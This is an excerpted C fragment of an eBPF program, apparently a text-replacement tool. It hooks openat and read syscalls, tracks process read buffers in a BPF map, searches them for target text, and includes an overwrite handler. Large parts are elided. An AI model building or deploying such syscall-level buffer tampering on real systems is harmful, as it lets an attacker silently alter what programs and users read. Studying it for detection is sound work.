...
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx) {
    ...
    bpf_printk("[TEXT_PEPLACE] PID %d Filename %s\n", pid, filename);
    return 0;
}
...
SEC("tp/syscalls/sys_exit_read")
int check_possible_address(struct trace_event_raw_sys_exit *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if(pbuff_addr == 0) {
        return 0;
    ...
    long unsigned int name_addr = 0;
    long unsigned int newline_counter = 0;
    long unsigned int match_counter = 0;

    char name[text_len_max];
    unsigned int j = 0;
    const unsigned int name_len = text_len;
    if(name_len < 0 || name_len > text_len_max) {
        return 0;
    }
    ...
    for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
        ...
        bpf_probe_read(&name, text_len_max, (char*)name_addr);
...
SEC("tp/syscalls/sys_exit_read")
int overwrite_address(struct trace_event_raw_sys_exit *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if(pbuff_addr == 0) {
        return 0;
